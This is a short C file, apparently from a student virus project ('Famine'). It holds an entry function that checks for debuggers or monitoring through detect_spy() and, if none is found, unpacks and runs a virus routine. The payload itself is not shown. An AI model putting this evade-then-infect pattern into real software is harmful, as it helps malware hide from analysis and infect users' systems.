/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   dear_client.c                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 00:21:46 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/07 07:24:07 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/types.h>
#include "famine.h"

#define ARRAY_SIZE(x) (sizeof(x) / sizeof(*x))

void	dear_client(const struct client_info *client)
{
	if (detect_spy() == false)
	{
		unpacker();
		virus();
	}
}
